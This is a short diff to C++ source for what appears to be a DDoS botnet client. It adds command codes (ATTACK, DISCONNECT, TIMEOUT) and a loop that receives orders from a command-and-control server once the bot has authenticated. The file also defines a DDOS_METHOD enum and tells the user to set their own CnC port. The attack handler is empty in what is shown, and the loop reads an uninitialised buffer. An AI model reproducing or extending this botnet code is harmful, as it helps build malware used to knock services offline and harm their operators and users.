@@ -16,7 +16,10 @@ void Main();
 #define PORT 5000 // Change this to your CnC Port
 
 #define AUTH 0x01
+#define ATTACK 0x02
+#define DISCONNECT 0x10
 #define SUCCESS 0x0F
+#define TIMEOUT 0x11
 
 enum DDOS_METHOD {
 	HTTP = 0x40,
@@ -100,6 +103,18 @@ void Main() {
 	}
 
 	std::cout << "[SUCCESS] Authenticated with the CnC" << std::endl;
+
+	char command[1];
+	while (command[0] != DISCONNECT)
+	{
+		recv(sock, command, sizeof(command), NULL);
+		Sleep(10);
+		switch (command[0])
+		{
+		case ATTACK:
+			break;
+		}
+	}
 }
 
 void DebugMode() {
